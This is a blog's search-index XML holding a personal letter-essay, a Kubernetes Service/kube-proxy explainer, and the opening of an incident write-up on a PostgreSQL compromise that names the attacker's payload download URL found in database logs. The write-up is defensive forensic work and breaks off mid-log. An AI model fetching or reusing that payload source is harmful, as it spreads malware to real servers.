<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
    
    <entry>
      <title><![CDATA[我想你也看到这朵云]]></title>
      <url>http://lexuslee.me/2019/07/27/2919-07-27-I-want-you-to-see-this-sky/</url>
      <content type="html"><![CDATA[<p><img src="https://upload-images.jianshu.io/upload_images/1851232-2bbf3206381b3645.jpeg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="云中骑士.jpeg"></p>
<p>「你快看这朵云，舒张得恰巧。像刚出城堡骑着穿山甲的鹫鹰骑士，持着大枪冲向巨龙，刺破了一片天，天外的金光像流萤一样泄了出来」</p>
<p>刚在百老汇看完<a href="https://movie.douban.com/subject/1304624/" target="_blank" rel="external">《旺角卡门》</a>, 饿得五脊六兽, 急冲冲地想去家粤菜馆子点一碗炖鸡老汤。</p>
<p>记得第一次聊起这部电影，是给你写信后的两三周，你也说王家卫的电影里从来不会讲这俩人是因为什么爱上的，却好像都是无缘无故就爱上了。只有状态，毫无因果。</p>
<p>这难道不迷人吗，我天生爱这些没由头的东西，它们是弹丸偏离轨道击碎的窗户，只能听见其响，意识过来时，玻璃渣已碎了一地。这些难以琢磨的不期而至的碰撞，总是不经意地夺走你的时光，直到踩在玻璃渣上刺痛了脚才反应过来。</p>
<p>但我仍然好奇在长久的一段时间后，阿娥会不会反应过来，那个藏起来的杯子，一直没有被找到。从此以往地，便是像每一天这样灰暗愁闷的日子，也得爱，也得焦心。她得有多难过。</p>
<p>莱蒙托夫说「也许我爱的已不是你，而是对你付出的热情。就像是一座神庙，即使荒芜，仍然是祭坛。一座雕像，即使坍塌，仍然是神」</p>
<p>我最近又陷入了这种状态，第一次知悉你要去北方，不免觉得北方那么冷，由不得任性，满脑子叮嘱你得穿秋裤。</p>
<p>等我真正到了北方，才发现北方的冬天是下雪的，一点也不冷，有几片孤花趁着下雪天旺盛地生长，有猫咪对着窗台飘的雪花跳脚。我憋足了劲儿说，你们都盛开起来吧，把白茫茫一片裸露的大地撕裂，把沸腾的鲜血都撒在上面。约莫半载，雪地里开始飘出红色的花瓣，风却慢慢把这些玫瑰吹散，最后枯竭得像精卫填海，填不进白茫茫一片，精疲力竭。</p>
<p>再后来，屋子搬来了年轻人，像所有青年才俊一样，卯住劲投身入热枕中。就像你当时走过的路，我总想着这些发自内心的不愉悦却要被汲汲营营的名誉、条条框框的规则、战战兢兢的人情所淹没，就感到无比的孤独。</p>
<p>我看你像大部分的水滴一样，流入了那条大河里，川流地河水互相摩擦生热逐渐漫起水雾，那些浓浊的雾气徘徊在你我之间，我想它散开，因为我怕看不见你，我又想它永远在这，因为我怕看不见你。</p>
<p>就像基因编辑里人们趋之若鹜地想要拼接自己的 DNA 移植上最优的属性，巴不得是个天生的六边形战士，流水工厂式的繁殖，一代一代商品化的高级人，予取予求地寻找另一位六边形战士，聚群成一类分不清的基因链，齐步行走着，像是动物世界里驼铃的迁移。我暗暗期望你不会是那个空茫的人之一，能有间隙从真实人生中探出头放空出来，去做些心怡的事儿，也期望之中有人能游到更加真实的、离得不远的一些去处，逃离这些日复一日消磨着人的远足。</p>
<p>去粤菜馆子的路上，看着窗外，这座城市像上了发条一般运转，循规蹈矩，咿呀作响，日复一日地用同一种模式运营着所有公民。仿佛悬浮于城市上空仍有一台工业时代的冒着仙气的蒸汽机，张牙舞爪地喷射着火焰，热飒了熊猫侠。似乎北方的夏天远比冬天令人生厌得多，不知道你那儿今夜起风吗。</p>
<p>起风了，就该有云，云卷云舒，然后再被风吹散。</p>
<p>归途路上，又不禁胡思乱想，那时候听你说想看成都的云，巴不得把天空扯得稀碎，结果只剩下三三两两形单影只的几朵，经不起妄想。</p>
<p>飘飘然地，在归途路上，遇见了它，像奔向风车的骑士，喜欢极了，我多想你也看到这朵云。</p>
<p>于北京，</p>
<p>粤菜馆子路上，</p>
<p>肚子饿饿饿。</p>
<p>2019/07/27</p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[浅谈 k8s service&kube-proxy]]></title>
      <url>http://lexuslee.me/2018/09/14/2018-09-14-k8s%20service&endpoint/</url>
      <content type="html"><![CDATA[<div style="text-align: right;">Lexus Lee</div>

<h3 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h3><p>最开始听到同事 k8s 分享时比较困惑我的一个问题是 k8s 怎么实现一个私有 ip(虚拟 ip，以下简称 vip)到另一个私有ip收发包的。</p>
<p>不过其实我想知道的应该是 k8s 通信机制，它是怎么实现服务发现的，新建的 pod 是怎么感知到的，万一有些 pod 节点变更 vip 变了 k8s 是如何感知的。</p>
<p>基于这个问题，做一下关于 k8s service&amp;kube-proxy 的分享。<br><a id="more"></a></p>
<h3 id="Service-amp-kube-proxy-概述"><a href="#Service-amp-kube-proxy-概述" class="headerlink" title="Service&amp;kube-proxy 概述"></a>Service&amp;kube-proxy 概述</h3><p>首先我建了一个 <code>replcas = 4</code>  <code>lebel: app=service_test_pod</code>的 python server deployment 来打出当前 pod 的 Hostname</p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line"><span class="attr">apiVersion:</span>  apps/v1</div><div class="line"><span class="attr">kind:</span> Deployment</div><div class="line"><span class="attr">metadata:</span></div><div class="line"><span class="attr">  name:</span> service-test</div><div class="line"><span class="attr">spec:</span></div><div class="line"><span class="attr">  replicas:</span> <span class="number">4</span></div><div class="line"><span class="attr">  selector:</span></div><div class="line"><span class="attr">    matchLabels:</span></div><div class="line"><span class="attr">      app:</span> service_test_pod</div><div class="line"><span class="attr">  template:</span></div><div class="line"><span class="attr">    metadata:</span></div><div class="line"><span class="attr">      labels:</span></div><div class="line"><span class="attr">        app:</span> service_test_pod</div><div class="line"><span class="attr">    spec:</span></div><div class="line"><span class="attr">      containers:</span></div><div class="line"><span class="attr">      - name:</span> simple-http</div><div class="line"><span class="attr">        image:</span> python:<span class="number">2.7</span></div><div class="line"><span class="attr">        imagePullPolicy:</span> IfNotPresent</div><div class="line"><span class="attr">        command:</span> [<span class="string">"/bin/bash"</span>]</div><div class="line"><span class="attr">        args:</span> [<span class="string">"-c"</span>, <span class="string">"echo \"&lt;p&gt;Hello from $(hostname)&lt;/p&gt;\" &gt; index.html; python -m SimpleHTTPServer 9999"</span>]</div><div class="line"><span class="attr">        ports:</span></div><div class="line"><span class="attr">        - name:</span> http</div><div class="line"><span class="attr">          containerPort:</span> <span class="number">9999</span></div></pre></td></tr></table></figure>
<p>可以看到启动了4个 pod </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">service-test-69764ddb4c-4hr2x                                     1/1       Running             0          8s        172.18.234.21    brand6</div><div class="line">service-test-69764ddb4c-gstft                                     1/1       Running             0          8s        172.18.83.225    belba2</div><div class="line">service-test-69764ddb4c-nnv29                                     1/1       Running             0          8s        172.18.156.140   brand2</div><div class="line">service-test-69764ddb4c-vx5pn                                     0/1       ContainerCreating   0          8s        &lt;none&gt;           belba3</div></pre></td></tr></table></figure>
<p>我必须挨个 curl 才能得到他们的 hostname</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">lilingzhi@belba1 ~/k8s/test $ curl 172.18.234.21:9999</div><div class="line">&lt;p&gt;Hello from service-test-69764ddb4c-4hr2x&lt;/p&gt;</div></pre></td></tr></table></figure>
<p>但不能让其他 pod 直接通过 vip 访问这些 pod ，需要一个更上层的一个抽象，把这4个提供相同服务的 pod 打包成一个对外的服务，通过某个入口地址来访问它，并且把请求均衡到4个pod上，这样一层的抽象包装是实现一个服务网络(service mesh)的基础。</p>
<p>而 k8s service 就是做这个的。</p>
<p>首先我们来看下什么是 k8s service:</p>
<blockquote>
<ul>
<li>A Kubernetes <code>Service</code> is an abstraction which defines a logical set of <code>Pods</code> and a policy by which to access them - sometimes called a micro-service. The set of <code>Pods</code> targeted by a <code>Service</code> is (usually) determined by a <a href="https://kubernetes.io/docs/concepts/overview/working-with-objects/labels/#label-selectors" target="_blank" rel="external"><code>Label Selector</code></a> (see below for why you might want a <code>Service</code> without a selector)</li>
</ul>
</blockquote>
<p>而打包pod成service并发布的微服务得支持 k8s 内部及外部的访问。</p>
<p>故 k8s service 提供了以下三种暴露 service 入口的模式:</p>
<blockquote>
<ul>
<li>ClusterIP: use a cluster-internal IP only - this is the default and is discussed above. Choosing this value means that you want this service to be reachable only from inside of the cluster.</li>
<li>NodePort: on top of having a cluster-internal IP, expose the service on a port on each node of the cluster (the same port on each node). You’ll be able to contact the service on any :NodePort address.</li>
<li>LoadBalancer: on top of having a cluster-internal IP and exposing service on a NodePort also, ask the cloud provider for a load balancer which forwards to the Service exposed as a :NodePort for each Node.</li>
</ul>
</blockquote>
<p>可以简单理解为 ClusterIp 是提供对内的访问入口，NodePort 和 LoadBalancer 是提供对外的，不过 LoadBalancer 是在暴露 NodePort 基础上提供可以接入外部的 LB。</p>
<p>那么我新建一个 service 给刚刚的 4 个 pod</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">lilingzhi@belba1 ~/k8s/test $ kubectl expose deployment service-test --type=&quot;NodePort&quot; --port 9098 --target-port=9999</div><div class="line">service/service-test exposed</div></pre></td></tr></table></figure>
<p>可以看到 </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">lilingzhi@belba1 ~/k8s/test $ kubectl get service -o wide</div><div class="line">NAME                   TYPE        CLUSTER-IP      EXTERNAL-IP   PORT(S)                               AGE       SELECTOR</div><div class="line">service-test           NodePort    172.19.97.3     &lt;none&gt;        9098:30255/TCP                        16s       app=service_test_pod</div></pre></td></tr></table></figure>
<p><code>service-test</code> 这儿就映射到 clusterIp 的 172.19.97.3:9098 端口上</p>
<p>再看下 endpoints</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">lilingzhi@belba1 ~/k8s/test $ kubectl get endpoints -o wide</div><div class="line">NAME                   ENDPOINTS                                                               AGE</div><div class="line">service-test           172.18.156.140:9999,172.18.193.66:9999,172.18.234.21:9999 + 1 more...   3m</div></pre></td></tr></table></figure>
<p>可以看到也建了一个包含 4个 host:port 的元组的 endpoint</p>
<p>通过不断 curl service ip:port 会发现请求已经均衡到4个 pod 上了</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">lilingzhi@belba1 ~/k8s/test $ curl 172.19.97.3:9098</div><div class="line">&lt;p&gt;Hello from service-test-69764ddb4c-4hr2x&lt;/p&gt;</div><div class="line">lilingzhi@belba1 ~/k8s/test $ curl 172.19.97.3:9098</div><div class="line">&lt;p&gt;Hello from service-test-69764ddb4c-gstft&lt;/p&gt;</div><div class="line">lilingzhi@belba1 ~/k8s/test $ curl 172.19.97.3:9098</div><div class="line">&lt;p&gt;Hello from service-test-69764ddb4c-4hr2x&lt;/p&gt;</div><div class="line">lilingzhi@belba1 ~/k8s/test $ curl 172.19.97.3:9098</div><div class="line">&lt;p&gt;Hello from service-test-69764ddb4c-gstft&lt;/p&gt;</div></pre></td></tr></table></figure>
<p>由于 k8s service 路由是通过 kube-proxy 决定的，默认是走的 iptables 转发的(可换成用户态 proxy 或 ipvs)，所以查一下相应的 iptables 规则</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">$ sudo iptables -L -v -n -t nat</div><div class="line"></div><div class="line">Chain KUBE-SERVICES (2 references)</div><div class="line">    0     0 KUBE-MARK-MASQ  tcp  --  *      *      !172.18.0.0/16        172.19.97.3          /* default/service-test: cluster IP */ tcp dpt:9098</div><div class="line">    0     0 KUBE-SVC-LY73ZDGF4KGO4YFJ  tcp  --  *      *       0.0.0.0/0            172.19.97.3          /* default/service-test: cluster IP */ tcp dpt:9098</div></pre></td></tr></table></figure>
<p>看到有条 <code>chain KUBE-SVC-LY73ZDGF4KGO4YFJ</code> 定义了 service-test 的转发规则，于是查看相应的 chain</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">Chain KUBE-SVC-LY73ZDGF4KGO4YFJ (2 references)</div><div class="line"> pkts bytes target     prot opt in     out     source               destination</div><div class="line">    0     0 KUBE-SEP-2T6K76SEPIPV3QKW  all  --  *      *       0.0.0.0/0            0.0.0.0/0            /* default/service-test: */ statistic mode random probability 0.25000000000</div><div class="line">    0     0 KUBE-SEP-75XULILUFIHXBBLY  all  --  *      *       0.0.0.0/0            0.0.0.0/0            /* default/service-test: */ statistic mode random probability 0.33332999982</div><div class="line">    0     0 KUBE-SEP-FFUABGNOKSNXGH7E  all  --  *      *       0.0.0.0/0            0.0.0.0/0            /* default/service-test: */ statistic mode random probability 0.50000000000</div><div class="line">    0     0 KUBE-SEP-MKK3T4CLASKIDMJS  all  --  *      *       0.0.0.0/0            0.0.0.0/0            /* default/service-test: */</div></pre></td></tr></table></figure>
<p>可以看到这条 <code>KUBE-SVC-LY73ZDGF4KGO4YFJ</code> chain 里有4个下一跳的 chain <code>KUBE-SEP-2T6K76SEPIPV3QKW</code> ，<code>KUBE-SEP-75XULILUFIHXBBLY</code>, <code>KUBE-SEP-FFUABGNOKSNXGH7E</code>, <code>KUBE-SEP-MKK3T4CLASKIDMJS</code>, 他们分别对应4个 pod 的 vip，并且设置了 iptables probability, 由上至下分别为 <code>25%</code>, <code>33.33%</code>, <code>50%</code>, <code>100%</code>, 由于 iptables 是顺序读的，这样确保了每个 pod 都是 <code>25%</code> 的请求分发的机率。</p>
<p>那么我们挑其中一条子 chain <code>KUBE-SEP-2T6K76SEPIPV3QKW</code> 跟进去看看</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">Chain KUBE-SEP-2T6K76SEPIPV3QKW (1 references)</div><div class="line"> pkts bytes target     prot opt in     out     source               destination</div><div class="line">    0     0 KUBE-MARK-MASQ  all  --  *      *       172.18.156.140       0.0.0.0/0            /* default/service-test: */</div><div class="line">    0     0 DNAT       tcp  --  *      *       0.0.0.0/0            0.0.0.0/0            /* default/service-test: */ tcp to:172.18.156.140:9999</div></pre></td></tr></table></figure>
<p>果不其然，这儿的 source ip 就是对应 pod 的 vip, 一个请求就这样转发到 pod 上，可以看到一共要经过3层 chain。</p>
<p><img src="http://7xse6j.com1.z0.glb.clouddn.com/k8s_share2.png" alt="chains"></p>
<p>不过有二义性的地方在于，这儿的 kube-proxy 实际上并不起一个 proxy 的作用，而是 watch 变更并更新 iptables，也就是说，client 的请求直接通过 iptables 路由，所以如果我们直接修改 iptables 也是可以奏效的。</p>
<h3 id="kube-proxy-源码分析"><a href="#kube-proxy-源码分析" class="headerlink" title="kube-proxy 源码分析"></a>kube-proxy 源码分析</h3><p>因为 kube-proxy 源码相对比较少，所以读了下源码，但还是蛮复杂的</p>
<p>kube-proxy 会作为 daemon 跑在每个节点上，对 api-server 中的 service &amp; endpoint 进行 watch ,一旦检测到更新则往 iptables 里全量推送新的转发规则，那么我们根据 <code>kubernetes/cmd/kube-proxy/proxy.go</code> 里找到 kube-proxy 真正的入口函数 <code>Run()</code></p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s *ProxyServer)</span> <span class="title">Run</span><span class="params">()</span> <span class="title">error</span></span> &#123;</div><div class="line">    ...</div><div class="line">	serviceConfig := config.NewServiceConfig(informerFactory.Core().V1().Services(), s.ConfigSyncPeriod)</div><div class="line">	serviceConfig.RegisterEventHandler(s.ServiceEventHandler)</div><div class="line">	<span class="keyword">go</span> serviceConfig.Run(wait.NeverStop)</div><div class="line"></div><div class="line">	endpointsConfig := config.NewEndpointsConfig(informerFactory.Core().V1().Endpoints(), s.ConfigSyncPeriod)</div><div class="line">	endpointsConfig.RegisterEventHandler(s.EndpointsEventHandler)</div><div class="line">	<span class="keyword">go</span> endpointsConfig.Run(wait.NeverStop)</div><div class="line"></div><div class="line">	<span class="comment">// This has to start after the calls to NewServiceConfig and NewEndpointsConfig because those</span></div><div class="line">	<span class="comment">// functions must configure their shared informer event handlers first.</span></div><div class="line">	<span class="keyword">go</span> informerFactory.Start(wait.NeverStop)</div><div class="line"></div><div class="line">	<span class="comment">// Birth Cry after the birth is successful</span></div><div class="line">	s.birthCry()</div><div class="line"></div><div class="line">	<span class="comment">// Just loop forever for now...</span></div><div class="line">	s.Proxier.SyncLoop()</div><div class="line">    <span class="keyword">return</span> <span class="literal">nil</span></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>这就是 kube-proxy 的入口函数，实际上即起一个 proxy server daemon</p>
<p>可以看到通过 <code>informerFactory</code>新建了2个 config 对象(serviceConfig, endpointsConfig), 这个 <code>informerFactory</code> 是什么呢？</p>
<p>k8s 里所有资源都存在 etcd 中提供 api 通过 apiserver 的接口访问，其中有个核心的公共组件即 <code>informer</code> 是对 apiserver 资源访问的一层包装，其中包括 api 访问, localcache 等…</p>
<p>所以这里的两个 config 对象即用来获取 etcd 中 service 和 endpoints 的信息，他们都调用了 <code>RegisterEventHandler</code> 注册了一个回调函数，这个函数用来监听变更并发送变更信号。</p>
<p>最后用 goroutine 跑起来。</p>
<p>之后的 <code>informerFactory.Start()</code> 则用来初始化 informer 对象注册的回调函数。</p>
<p>最后把 proxy server loop 跑起来 <code>Proxier.SyncLoop()</code> 等待信号。</p>
<p>接着我们先看下 service 的  <code>NewServiceConfig</code> 这个函数，因为 endpoint 估计也是类似的。</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// NewServiceConfig creates a new ServiceConfig.</span></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">NewServiceConfig</span><span class="params">(serviceInformer coreinformers.ServiceInformer, resyncPeriod time.Duration)</span> *<span class="title">ServiceConfig</span></span> &#123;</div><div class="line">	result := &amp;ServiceConfig&#123;</div><div class="line">		lister:       serviceInformer.Lister(),</div><div class="line">		listerSynced: serviceInformer.Informer().HasSynced,</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	serviceInformer.Informer().AddEventHandlerWithResyncPeriod(</div><div class="line">		cache.ResourceEventHandlerFuncs&#123;</div><div class="line">			AddFunc:    result.handleAddService,</div><div class="line">			UpdateFunc: result.handleUpdateService,</div><div class="line">			DeleteFunc: result.handleDeleteService,</div><div class="line">		&#125;,</div><div class="line">		resyncPeriod,</div><div class="line">	)</div><div class="line"></div><div class="line">	<span class="keyword">return</span> result</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>看到它结构体里就两个对象 <code>lister</code> 和 <code>listerSynced</code>，所以我们接着看下 <code>serviceInformer</code></p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">type</span> ServiceInformer <span class="keyword">interface</span> &#123;</div><div class="line">	Informer() cache.SharedIndexInformer</div><div class="line">	Lister() v1.ServiceLister</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>看到是个通用对象 <code>SharedIndexInformer</code> 即上述提及的公共组件，故不往里深究。</p>
<p>接着回来看注册进去的回调函数，举个栗子，这儿的 <code>UpdateFunc: result.handleUpdateService</code> 最终会调到 <code>iptables.go</code> 里的 <code>OnServiceUpdate</code> </p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">func</span> <span class="params">(c *ServiceConfig)</span> <span class="title">handleUpdateService</span><span class="params">(oldObj, newObj <span class="keyword">interface</span>&#123;&#125;)</span></span> &#123;</div><div class="line">	oldService, ok := oldObj.(*v1.Service)</div><div class="line">	<span class="keyword">if</span> !ok &#123;</div><div class="line">		utilruntime.HandleError(fmt.Errorf(<span class="string">"unexpected object type: %v"</span>, oldObj))</div><div class="line">		<span class="keyword">return</span></div><div class="line">	&#125;</div><div class="line">	service, ok := newObj.(*v1.Service)</div><div class="line">	<span class="keyword">if</span> !ok &#123;</div><div class="line">		utilruntime.HandleError(fmt.Errorf(<span class="string">"unexpected object type: %v"</span>, newObj))</div><div class="line">		<span class="keyword">return</span></div><div class="line">	&#125;</div><div class="line">	<span class="keyword">for</span> i := <span class="keyword">range</span> c.eventHandlers &#123;</div><div class="line">		glog.V(<span class="number">4</span>).Infof(<span class="string">"Calling handler.OnServiceUpdate"</span>)</div><div class="line">		c.eventHandlers[i].OnServiceUpdate(oldService, service)</div><div class="line">	&#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="params">(proxier *Proxier)</span> <span class="title">OnServiceUpdate</span><span class="params">(oldService, service *v1.Service)</span></span> &#123;</div><div class="line">	<span class="keyword">if</span> proxier.serviceChanges.Update(oldService, service) &amp;&amp; proxier.isInitialized() &#123;</div><div class="line">		proxier.syncRunner.Run()</div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>所以监听到变更之后调用的这个 <code>proxier.syncRunner.Run()</code> 是什么呢，得看下这个 <code>syncRunner</code> 在做什么</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line">proxier.syncRunner = async.NewBoundedFrequencyRunner(<span class="string">"sync-runner"</span>, proxier.syncProxyRules, minSyncPeriod, syncPeriod, burstSyncs)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="params">(bfr *BoundedFrequencyRunner)</span> <span class="title">Run</span><span class="params">()</span></span> &#123;</div><div class="line">	<span class="comment">// If it takes a lot of time to run the underlying function, noone is really</span></div><div class="line">	<span class="comment">// processing elements from &lt;run&gt; channel. So to avoid blocking here on the</span></div><div class="line">	<span class="comment">// putting element to it, we simply skip it if there is already an element</span></div><div class="line">	<span class="comment">// in it.</span></div><div class="line">	<span class="keyword">select</span> &#123;</div><div class="line">	<span class="keyword">case</span> bfr.run &lt;- <span class="keyword">struct</span>&#123;&#125;&#123;&#125;:</div><div class="line">	<span class="keyword">default</span>:</div><div class="line">	&#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="params">(bfr *BoundedFrequencyRunner)</span> <span class="title">Loop</span><span class="params">(stop &lt;-<span class="keyword">chan</span> <span class="keyword">struct</span>&#123;&#125;)</span></span> &#123;</div><div class="line">	glog.V(<span class="number">3</span>).Infof(<span class="string">"%s Loop running"</span>, bfr.name)</div><div class="line">	bfr.timer.Reset(bfr.maxInterval)</div><div class="line">	<span class="keyword">for</span> &#123;</div><div class="line">		<span class="keyword">select</span> &#123;</div><div class="line">		<span class="keyword">case</span> &lt;-stop:</div><div class="line">			bfr.stop()</div><div class="line">			glog.V(<span class="number">3</span>).Infof(<span class="string">"%s Loop stopping"</span>, bfr.name)</div><div class="line">			<span class="keyword">return</span></div><div class="line">		<span class="keyword">case</span> &lt;-bfr.timer.C():</div><div class="line">			bfr.tryRun()</div><div class="line">		<span class="keyword">case</span> &lt;-bfr.run:</div><div class="line">			bfr.tryRun()</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p><code>syncRunner</code> 里注册了个 <code>syncProxyRules</code> 的回调函数，而刚刚 updateSync 中触发的 run 函数则用 select 发送了一个 <code>bfr.run</code> 信号，之前所提及的 proxy server 一旦收到信号就会跑一次 <code>tryRun()</code>调用到这个 <code>syncProxyRules</code> 的回调函数。</p>
<p>于是我们走到 <code>syncProxyRules</code>, 这个函数特别长，但简而言之就是做一些 iptables 的 ensure 和 update 操作。</p>
<p>这样一来，整个流程就走通了。</p>
<p>靠北，开发 k8s 的 google 工程师真的很机车，代码真的有点绕哦！</p>
<h3 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h3><p>最后我们来理一下 service &amp;&amp; endpoint &amp;&amp; kube-proxy 的关系。</p>
<p>service / endpoint 是pod对外暴露访问地址的封装，Kube-proxy 用来管理这些封装，做一些 ensure&amp;update 的操作</p>
<p><img src="http://7xse6j.com1.z0.glb.clouddn.com/k8s_share.png" alt="kube-proxy model"></p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[记一次 postgresql 斯嘉丽约翰逊攻击的排查]]></title>
      <url>http://lexuslee.me/2018/08/11/2018-08-11-scarlett-johansson-sql-attack/</url>
      <content type="html"><![CDATA[<h3 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h3><p>今天下午连续收到了腾讯云 CPU overload 报警</p>
<p><img src="http://7xse6j.com1.z0.glb.clouddn.com/CPU%20Overload.png" alt="CPU Usage"></p>
<p>登服务器一看, 有个 postgres 账户跑的进程把 CPU 占满了，进程名特别奇怪。</p>
<p><img src="http://7xse6j.com1.z0.glb.clouddn.com/htopinfo.png" alt="Htop info"></p>
<a id="more"></a>
<h3 id="排查"><a href="#排查" class="headerlink" title="排查"></a>排查</h3><p>于是根据 pid 到 <code>/proc/20619/stack</code> 下看到有一长串的 <code>[&lt;ffffffff81841ff2&gt;] entry_SYSCALL_64_fastpath+0x16/0x71</code> ，似乎短时间里发起大量的系统调用(prepare)并且还在不断增长。</p>
<p>接着 <code>cat /proc/20619/cmdline</code> 发现执行的是 <code>/var/lib/postgresql/9.5/main/Ac2p018-0</code> 这个坏家伙，查看发现这是个二进制文件，看不出问题，猜测和 postgresql 数据库有关，看起来不像是什么数据库维护脚本，第一反应是被数据库攻击了，于是查看 <code>/var/lib/postgresql/.bash_history</code> 和 <code>/var/lib/postgresql/.psql_history</code> 发现一条记录都没，显然是被手动清空了，更加确定是被 hack 了。担心已经被拿到 root 权限了，于是通过 <code>lastlog</code> 和 <code>last</code> 查看登录状态，所幸之前的 root 账户的 ip 都是我自己的，只有 postgres 这个账户看起来异常。</p>
<p>接着到 <code>/var/lib/postgresql/9.5/main/pg_log</code> 下查看数据库日志，抓到了几个奇怪的地方：</p>
<ol>
<li>有一个长连接持续从 <code>http://aluka.info/x6</code> 下载文件，</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div 